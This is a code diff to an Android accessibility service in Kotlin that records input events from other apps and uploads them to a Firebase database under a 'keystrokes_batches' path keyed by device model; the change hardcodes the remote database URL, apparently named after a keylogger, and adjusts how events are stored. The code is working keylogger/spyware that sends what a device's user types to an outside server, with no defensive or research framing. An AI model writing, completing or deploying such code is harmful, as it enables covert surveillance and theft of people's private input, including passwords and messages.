@@ -12,17 +12,15 @@ import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
 
 @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
 class AppAccessibilityService : AccessibilityService() {
     companion object {
         private const val TAG = "AppAccessibilityService"
+        private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
         private val scope = CoroutineScope(Dispatchers.IO)
         private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
-            FirebaseDatabase.getInstance().getReference().child("keystrokes_batches").child(deviceName)
+            FirebaseDatabase.getInstance(DB_URL).getReference().child("keystrokes_batches").child(deviceName)
         } catch (e: Exception) {
             Log.e(TAG, "Error getting database ref", e)
             null
@@ -90,7 +88,6 @@ class AppAccessibilityService : AccessibilityService() {
                 try {
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                     val ref = getDatabaseRef(deviceName) ?: return@launch
-                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                     val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")
 
                     val eventData = mapOf(
@@ -100,7 +97,7 @@ class AppAccessibilityService : AccessibilityService() {
                         "timestamp" to System.currentTimeMillis()
                     )
 
-                    ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
+                    ref.child("accessibility_$sanitizedAppName").push().setValue(eventData)
                 } catch (e: Exception) {
                     Log.e(TAG, "Error in accessibility coroutine", e)
                 }
